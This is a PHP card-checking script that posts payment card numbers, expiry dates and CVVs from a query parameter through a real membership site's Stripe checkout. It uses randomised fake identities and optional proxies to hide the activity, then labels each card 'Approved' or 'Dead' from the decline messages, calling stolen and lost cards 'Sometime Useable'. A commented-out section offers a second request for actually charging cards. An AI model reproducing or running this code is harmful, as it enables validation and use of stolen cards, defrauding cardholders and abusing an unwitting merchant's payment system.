<?php

///////////////BASE BY ////////////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = proxies();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[1st Req]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); uncomment to use proxy.txt
curl_setopt($ch, CURLOPT_URL, 'https://sweatysoulstudio.com/wp-admin/admin-ajax.php');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: sweatysoulstudio.com',
'accept: application/json, text/javascript, */*; q=0.01', 
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://sweatysoulstudio.com/',
'referer: https://sweatysoulstudio.com/strength-workouts/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'x-requested-with:XMLHttpRequest'
));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=arm_membership_setup_form_ajax_action&form_random_key=10_f54JzukdXw&setup_id=10&setup_action=membership_setup&arm_user_old_plan=0&arm_is_user_logged_in_flag=0&arm_front_plan_skin_type=skin1&subscription_plan=9&arm_paid_post=5669132&arm_plan_type=paid_infinite&first_name=Mike&user_email='.$name.'owen%40gmail.com&user_login='.$name.'&user_pass=Mike938%40&arm_action=create-your-account-8lv&redirect_to=https%3A%2F%2Fsweatysoulstudio.com&isAdmin=0&referral_url=http%3A%2F%2Fsweatysoulstudio.kodendigital.co.uk&arm_form_id=112&form_filter_kp=34&form_filter_st=1614932684&arm_nonce_check=fde5a8800b&arm_front_gateway_skin_type=radio&payment_gateway=stripe&arm_payment_mode%5Bstripe%5D=manual_subscription&stripe%5Bcard_holder_name%5D=James+Curry&stripe%5Bcard_number%5D='.$cc.'&stripe%5Bexp_month%5D='.$mes.'&stripe%5Bexp_year%5D='.$ano.'&stripe%5Bcvc%5D='.$cvv.'&arm_selected_payment_mode=manual_subscription&arm_total_payable_amount=39.00&arm_zero_amount_discount=0.00&hgmsjzhf=');

$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
/*
 $ch = curl_init();

//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); Uncomment to use proxy.txt
 curl_setopt($ch, CURLOPT_URL, '#');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'accept: application/json, text/javascript,  ',   
   'Origin: #',
   'referer: #',
   'Sec-Fetch-Mode: cors',
//'X-Requested-With: XMLHttpRequest',
 ));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '#');
*/
 $result = curl_exec($ch);
 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVV MATCHED  </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVV MATCHED  </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVC MATCHED </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CCN LIVE </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CCN LIVE /span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">CCN LIVE</span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CCN LIVE  </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVC MATCHED - Incorrect Zip  </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Stolen_Card - Sometime Useable  </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Lost_Card - Sometime Useable  </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Insufficient Funds  </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Card Expired </span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Pickup Card_Card - Sometime Useable  </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Incorrect Card Number </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Incorrect Card Number </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">Card Declined</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Declined : Generic_Decline </span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Declined : Do_Not_Honor </span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Security Code Check : Unchecked [Proxy Dead] </span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Security Code Check : Fail </span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Expired Card </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Card Doesnt Support This Purchase </span> </br>';
}
 else {
  echo '<span class="badge badge-warning">Dead</span> <span class="badge badge-warning">' . $lista . '</span> <span class="badge badge-warning"> Proxy Dead / Error Not Listed </span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result
//echo $token; to check if token captured or not 

///////////////////////////////////////////////====== By ===============\\\\\\\\\\\\\\\[Used Reboot13 Raw Base ]
?>
